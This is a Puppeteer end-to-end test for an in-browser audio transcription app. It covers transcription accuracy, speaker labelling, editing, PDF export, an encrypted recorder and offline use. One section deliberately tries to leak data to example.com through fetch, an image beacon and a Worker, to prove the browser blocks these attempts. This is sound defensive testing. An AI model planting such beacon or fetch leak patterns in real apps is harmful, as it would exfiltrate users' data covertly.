// End-to-end check in a real (headless) Chrome, run before every release.
// Uses only public-domain speech (JFK, 1961) and a made-up conversation spoken by
// computer voices. Never real recordings.
//
// It proves:
//   1. a WAV and a longer MP3 are transcribed correctly
//   2. two voices in a conversation are told apart and labelled
//   3. the app made no request to any other website while doing it
//   4. attempts to send data elsewhere are blocked by the browser
//   5. the built-in recorder saves safely (encrypted, survives a crash, deletes cleanly)
//   6. it still works with the network switched off
//
// TEST_MODEL picks the quality setting. TEST_SCOPE=basic runs only part 1 (used for the
// large "Most accurate" model to keep the build quick).
import puppeteer from 'puppeteer-core';
import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { existsSync, readFileSync } from 'node:fs';
import { extname, join, normalize } from 'node:path';

const root = new URL('..', import.meta.url).pathname;
const dist = join(root, 'dist');
const BASIC = process.env.TEST_SCOPE === 'basic';
const PREFIX = '/session-transcriber/'; // mimic GitHub Pages serving from a sub-folder
const TYPES = {
  '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.mjs': 'text/javascript', '.css': 'text/css',
  '.json': 'application/json', '.webmanifest': 'application/manifest+json', '.wasm': 'application/wasm',
  '.svg': 'image/svg+xml', '.png': 'image/png', '.onnx': 'application/octet-stream', '.txt': 'text/plain', '.woff2': 'font/woff2',
};

const server = createServer(async (req, res) => {
  const path = decodeURIComponent(new URL(req.url, 'http://x').pathname);
  if (!path.startsWith(PREFIX)) { res.writeHead(404).end(); return; }
  let rel = normalize(path.slice(PREFIX.length));
  if (rel === '.' || rel === '') rel = 'index.html';
  if (rel.startsWith('..')) { res.writeHead(403).end(); return; }
  try {
    const body = await readFile(join(dist, rel));
    res.writeHead(200, { 'Content-Type': TYPES[extname(rel)] || 'application/octet-stream', 'Cache-Control': 'max-age=600' }).end(body);
  } catch (_) { res.writeHead(404).end(); }
});
await new Promise((r) => server.listen(0, '127.0.0.1', r));
const origin = `http://127.0.0.1:${server.address().port}`;
const url = origin + PREFIX;

const chrome = process.env.CHROME_PATH || ['/usr/bin/google-chrome', '/usr/bin/google-chrome-stable', '/usr/bin/chromium-browser', '/usr/bin/chromium'].find(existsSync);
const browser = await puppeteer.launch({ executablePath: chrome, headless: true, args: [
  '--no-sandbox',
  '--use-fake-ui-for-media-stream', // auto-allow the microphone
  '--use-fake-device-for-media-stream',
  `--use-file-for-fake-audio-capture=${join(root, 'tests/jfk.wav')}`, // the 'microphone' plays the JFK clip on a loop
] });
const page = await browser.newPage();
await page.setViewport({ width: 1100, height: 900 });
const foreign = [];
const failed = [];
const logs = [];
page.on('request', (r) => { const u = r.url(); if (!u.startsWith(origin) && !u.startsWith('blob:') && !u.startsWith('data:')) foreign.push(u); });
page.on('requestfailed', (r) => failed.push(`${r.url()} (${r.failure()?.errorText})`));
page.on('console', (m) => logs.push(`[${m.type()}] ${m.text()}`));
page.on('pageerror', (e) => logs.push(`[pageerror] ${e.message}`));
page.on('dialog', (d) => d.accept());

const results = [];
const check = (name, ok, detail = '') => { results.push({ name, ok }); console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? '  — ' + detail : ''}`); };
// Strip times and punctuation, join lines: models differ on small words ("ask"/"asked") and line breaks.
const plain = (s) => s.replace(/^\[[\d:]+\] /gm, ' ').toLowerCase().replace(/[^a-z ]+/g, ' ').replace(/\s+/g, ' ');
const KEY = 'what your country can do for you';
// Live microphone audio is lower quality, so a small model can mishear a word or two.
const heard = (s) => /can do for (you|your country)/.test(plain(s));

async function ready() {
  await page.waitForFunction(() => !document.getElementById('step-file').hidden, { timeout: 180000 });
}
async function pickModel() {
  if (!process.env.TEST_MODEL) return;
  await page.click(`input[name="model"][value="${process.env.TEST_MODEL}"]`);
}
/** The transcript as shown on screen: rows of { t, end, who, text, check }. */
const rows = () => page.$$eval('#turns .turn', (els) => els.map((el) => ({
  t: Number(el.dataset.t),
  end: Number(el.dataset.end),
  who: el.querySelector('.turn-who')?.selectedOptions[0]?.textContent ?? '',
  text: el.querySelector('.turn-text').textContent,
  check: !el.querySelector('.turn-check').hidden,
})));
const asText = (list) => list.map((r) => `[${String(Math.floor(r.t / 60)).padStart(2, '0')}:${String(Math.floor(r.t % 60)).padStart(2, '0')}] ${r.who ? r.who + ': ' : ''}${r.text}`).join('\n');

async function transcribeLoaded() {
  const t0 = Date.now();
  await page.click('#start');
  await page.waitForFunction(() => {
    const s = document.getElementById('status').textContent;
    return s.startsWith('Finished') || !document.getElementById('error').hidden;
  }, { timeout: 1500000 });
  const error = await page.$eval('#error', (e) => (e.hidden ? '' : e.textContent));
  if (error) throw new Error(`App showed an error: ${error}`);
  const list = await rows();
  return { rows: list, text: asText(list), seconds: (Date.now() - t0) / 1000 };
}
async function transcribe(file) {
  const input = await page.$('#file');
  await input.uploadFile(join(root, 'tests', file));
  await page.waitForFunction(() => !document.getElementById('start').disabled);
  return transcribeLoaded();
}

let exit = 1;
try {
  await page.goto(url, { waitUntil: 'load' });
  await ready();
  await pickModel();
  const info = await page.evaluate(() => ({ isolated: self.crossOriginIsolated, controlled: !!navigator.serviceWorker.controller, cores: navigator.hardwareConcurrency }));
  check('service worker in control', info.controlled);
  check('multi-core mode available (cross-origin isolated)', info.isolated, `${info.cores} cores`);

  // ---- 1. plain transcription ----
  const short = await transcribe('jfk.wav');
  console.log('--- jfk.wav ---\n' + short.text);
  check('WAV transcribed correctly', plain(short.text).includes(KEY), `${short.seconds.toFixed(1)} s for 11 s of audio`);
  check('one voice is not split into two people', new Set(short.rows.map((r) => r.who)).size === 1, [...new Set(short.rows.map((r) => r.who))].join(', '));

  const long = await transcribe('long.mp3');
  console.log('--- long.mp3 ---\n' + long.text);
  const hits = plain(long.text).split(KEY).length - 1;
  check('88-second stereo MP3 transcribed across several sections', hits >= 7, `${hits}/8 repeats found, ${long.seconds.toFixed(1)} s for 88 s of audio`);
  const starts = long.rows.map((r) => r.t);
  check('times increase and reach the end of the recording', starts.every((v, i) => i === 0 || v >= starts[i - 1]) && Math.max(...long.rows.map((r) => r.end)) >= 80, `last line ends at ${Math.max(...long.rows.map((r) => r.end)).toFixed(0)} s`);

  if (!BASIC) {
    // ---- 2. two voices ----
    const truth = JSON.parse(readFileSync(join(root, 'tests/dialogue.json'), 'utf8'));
    const talk = await transcribe('dialogue.mp3');
    console.log('--- dialogue.mp3 ---\n' + talk.text);
    const names = [...new Set(talk.rows.map((r) => r.who))];
    check('two people found in the conversation', names.length === 2 && names.includes('Helper') && names.includes('Helpee'), names.join(', '));
    // Score: for each line on screen, who was really talking for most of it?
    let right = 0;
    let total = 0;
    for (const r of talk.rows) {
      const share = { A: 0, B: 0 };
      for (const t of truth) share[t.speaker] += Math.max(0, Math.min(r.end, t.end) - Math.max(r.t, t.start));
      if (share.A + share.B <= 0) continue;
      const real = share.A >= share.B ? 'Helper' : 'Helpee'; // voice A opens the session
      const weight = r.text.length;
      total += weight;
      if (r.who === real) right += weight;
    }
    const accuracy = total ? right / total : 0;
    check('lines are labelled with the right person', accuracy >= 0.9, `${(accuracy * 100).toFixed(0)}% of the text, ${talk.rows.length} lines, ${talk.rows.filter((r) => r.check).length} marked to check, ${talk.seconds.toFixed(1)} s for 120 s of audio`);
    check('first speaker gets the first name', talk.rows[0]?.who === 'Helper', talk.rows[0]?.who);

    // Swapping names in "Check who is who" relabels every line.
    await page.select('#who .who-line select', '1');
    const swapped = await rows();
    check('swapping who is who relabels the whole transcript', swapped[0].who === 'Helpee' && swapped.every((r, i) => r.who !== talk.rows[i].who));
    // Renaming a person updates the labels.
    await page.$eval('#people-list input', (i) => { i.value = 'FR'; i.dispatchEvent(new Event('input', { bubbles: true })); });
    const renamed = await rows();
    check('renaming a person updates the labels', renamed.some((r) => r.who === 'FR') && !renamed.some((r) => r.who === 'Helper'));
    await page.$eval('#people-list input', (i) => { i.value = 'Helper'; i.dispatchEvent(new Event('input', { bubbles: true })); });
    // Enter splits a line; the second half goes to the other person.
    const before = swapped.length;
    await page.evaluate(() => {
      const el = [...document.querySelectorAll('#turns .turn-text')].find((e) => e.textContent.length > 40);
      el.focus();
      const range = document.createRange();
      range.setStart(el.firstChild, el.textContent.indexOf(' ', 15) + 1);
      range.collapse(true);
      const sel = getSelection();
      sel.removeAllRanges();
      sel.addRange(range);
    });
    await page.keyboard.press('Enter');
    check('Enter splits a line in two', (await rows()).length === before + 1);
    await page.keyboard.press('Backspace');
    check('Backspace at the start joins it back', (await rows()).length === before);
    // PDF export, made on the device.
    const pdf = await page.evaluate(async () => {
      const { makePdf } = await import('./pdf.js');
      const bytes = await makePdf({ lines: [{ time: 0, person: 0, name: 'Helper', text: 'Hello there.' }, { time: 4, person: 1, name: 'Helpee', text: 'Hi. '.repeat(900) }], labelled: true, names: ['Helper', 'Helpee'], showTimes: true, recording: 'test', footerName: 'Test Name' });
      return { size: bytes.length, head: String.fromCharCode(...bytes.slice(0, 5)) };
    });
    check('a PDF is made on the device', pdf.head === '%PDF-' && pdf.size > 20000, `${Math.round(pdf.size / 1024)} KB`);
    await page.click('#save-pdf');
    await page.waitForFunction(() => /PDF saved/.test(document.getElementById('saved').textContent) || !document.getElementById('error').hidden, { timeout: 30000 });
    check('Save as PDF works from the transcript', /PDF saved/.test(await page.$eval('#saved', (e) => e.textContent)), await page.$eval('#error', (e) => (e.hidden ? '' : e.textContent)));
    await page.$eval('#clear', (b) => b.click());

    // ---- audio settings ----
    await page.click('#audio-open');
    await page.waitForFunction(() => document.querySelectorAll('#set-out option').length >= 2 && document.querySelectorAll('#set-mic option').length >= 2, { timeout: 15000 });
    const devices = await page.evaluate(() => ({ outs: [...document.querySelectorAll('#set-out option')].map((o) => o.textContent), mics: [...document.querySelectorAll('#set-mic option')].map((o) => o.textContent) }));
    check('audio settings list the speakers and microphones', devices.outs.length >= 2 && devices.mics.length >= 2, `${devices.outs.length} outputs, ${devices.mics.length} microphones`);
    const outValue = await page.$eval('#set-out', (s) => s.options[s.options.length - 1].value);
    await page.select('#set-out', outValue);
    await (await page.$('#file')).uploadFile(join(root, 'tests', 'jfk.wav'));
    await page.waitForFunction((v) => document.getElementById('player').sinkId === v, { timeout: 10000 }, outValue).catch(() => {});
    check('chosen headphones or speakers are used for playback', (await page.$eval('#player', (p) => p.sinkId)) === outValue);
    const micValue = await page.$eval('#set-mic', (s) => s.options[s.options.length - 1].value);
    await page.select('#set-mic', micValue);
    check('chosen microphone carries over to the recorder', (await page.$eval('#mic', (s) => s.value)) === micValue);
    await page.select('#set-mic', '');
    await page.select('#set-out', '');
    await page.click('#audio-close');
    await page.$eval('#clear', (b) => b.click());
    await page.evaluate(() => { localStorage.clear(); });

    // ---- 3 & 4. nothing leaves the device ----
    const blocked = await page.evaluate(async () => {
      const out = {};
      try { await fetch('https://example.com/?leak=1', { mode: 'no-cors' }); out.fetch = 'SENT'; } catch (_) { out.fetch = 'blocked'; }
      out.beacon = await new Promise((resolve) => { const i = new Image(); i.onload = () => resolve('SENT'); i.onerror = () => resolve('blocked'); i.src = 'https://example.com/pixel.png?leak=1'; });
      try {
        const w = new Worker(URL.createObjectURL(new Blob(["fetch('https://example.com/?leak=2',{mode:'no-cors'}).then(()=>postMessage('SENT'),()=>postMessage('blocked'))"], { type: 'text/javascript' })));
        out.worker = await new Promise((resolve) => { w.onmessage = (e) => resolve(e.data); w.onerror = () => resolve('blocked'); });
      } catch (_) { out.worker = 'blocked'; }
      out.storage = { local: localStorage.length, idb: (await indexedDB.databases?.())?.length ?? 0 };
      return out;
    });
    check('sending data to another website is blocked (fetch, image, worker)', blocked.fetch === 'blocked' && blocked.beacon === 'blocked' && blocked.worker === 'blocked', JSON.stringify(blocked));
    check('nothing written to browser storage', blocked.storage.local === 0 && blocked.storage.idb === 0);
    const leaked = foreign.filter((u) => !u.startsWith('https://example.com/'));
    check('app itself contacted no other website', leaked.length === 0, leaked.join(', '));

    // ---- 5. built-in recorder (fake microphone plays the JFK clip on a loop) ----
    const keptCount = () => page.evaluate(async () => {
      const dbs = (await indexedDB.databases()).map((d) => d.name);
      if (!dbs.includes('st-recorder')) return { sessions: 0, chunks: 0 };
      const db = await new Promise((r) => { const q = indexedDB.open('st-recorder'); q.onsuccess = () => r(q.result); });
      const count = (s) => new Promise((r) => { const q = db.transaction(s).objectStore(s).count(); q.onsuccess = () => r(q.result); });
      const out = { sessions: await count('sessions'), chunks: await count('chunks') };
      const first = await new Promise((r) => { const q = db.transaction('chunks').objectStore('chunks').openCursor(); q.onsuccess = () => r(q.result?.value); });
      if (first) {
        const head = new Uint8Array(first.data.slice(0, 4));
        out.plainAudioHeader = head[0] === 0x1a && head[1] === 0x45 && head[2] === 0xdf && head[3] === 0xa3; // WebM signature
      }
      db.close();
      return out;
    });
    const recordFor = async (seconds) => {
      await page.click('#rec-open');
      await page.waitForFunction(() => !document.getElementById('rec-start').disabled, { timeout: 15000 });
      await page.click('#rec-start');
      await page.waitForFunction(() => !document.getElementById('rec-stop').hidden, { timeout: 15000 });
      await new Promise((r) => setTimeout(r, seconds * 1000));
    };

    // Crash part-way: leave the page while recording, come back, recover it.
    await recordFor(14);
    const midway = await keptCount();
    check('recording is saved to the device while it records', midway.sessions === 1 && midway.chunks >= 2, JSON.stringify(midway));
    check('saved recording pieces are encrypted', midway.plainAudioHeader === false);
    const awake = await page.evaluate(async () => { const l = await navigator.wakeLock.request('screen'); const ok = !l.released; await l.release(); return ok; }).catch(() => 'unsupported');
    check('screen wake lock available', awake === true || awake === 'unsupported', String(awake));
    await page.goto(url, { waitUntil: 'load' });
    await ready();
    await pickModel();
    check('after a crash the recording is offered back', (await page.$$eval('#kept-list li', (lis) => lis.length)) === 1);
    await page.click('#kept-list li button'); // Open
    await page.waitForFunction(() => !document.getElementById('start').disabled);
    const recovered = await transcribeLoaded();
    check('recovered recording transcribes', heard(recovered.text), recovered.text.split('\n')[0]);
    await page.click('#rec-delete');
    await page.waitForFunction(() => document.getElementById('kept').hidden);

    // Normal recording with a pause, then stop and transcribe.
    await recordFor(12);
    await page.click('#rec-pause');
    await new Promise((r) => setTimeout(r, 3000));
    await page.click('#rec-pause');
    await new Promise((r) => setTimeout(r, 12000));
    await page.click('#rec-stop');
    await page.waitForFunction(() => !document.getElementById('rec-actions').hidden, { timeout: 30000 });
    const recInfo = await page.$eval('#file-info', (e) => e.textContent);
    const secs = (recInfo.match(/\((\d\d):(\d\d)\)/) || []).slice(1).map(Number);
    const length = secs.length ? secs[0] * 60 + secs[1] : -1;
    check('timer excludes the pause', length >= 22 && length <= 27, recInfo);
    const recorded = await transcribeLoaded();
    check('recording made in the app transcribes', heard(recorded.text), `${recorded.seconds.toFixed(1)} s`);
    await page.click('#rec-delete');
    await page.waitForFunction(() => document.getElementById('kept').hidden);
    const after = await keptCount();
    check('deleting leaves nothing stored', after.sessions === 0 && after.chunks === 0, JSON.stringify(after));

    // ---- 6. offline ----
    await page.setOfflineMode(true);
    await page.goto(url, { waitUntil: 'load' }); // fresh visit with no network
    await ready();
    await pickModel();
    const offline = await transcribe('dialogue.mp3');
    check('works with the network switched off, speaker labels included', plain(offline.text).includes('one box') && new Set(offline.rows.map((r) => r.who)).size === 2, `${offline.seconds.toFixed(1)} s`);
  }

  exit = results.every((r) => r.ok) ? 0 : 1;
} catch (err) {
  console.log('FAIL  test run stopped:', err.message);
  console.log(logs.slice(-25).join('\n'));
  console.log('failed requests:', failed.slice(-10).join('\n'));
} finally {
  await browser.close();
  server.close();
}
console.log(exit === 0 ? '\nAll checks passed.' : '\nSome checks FAILED.');
process.exit(exit);
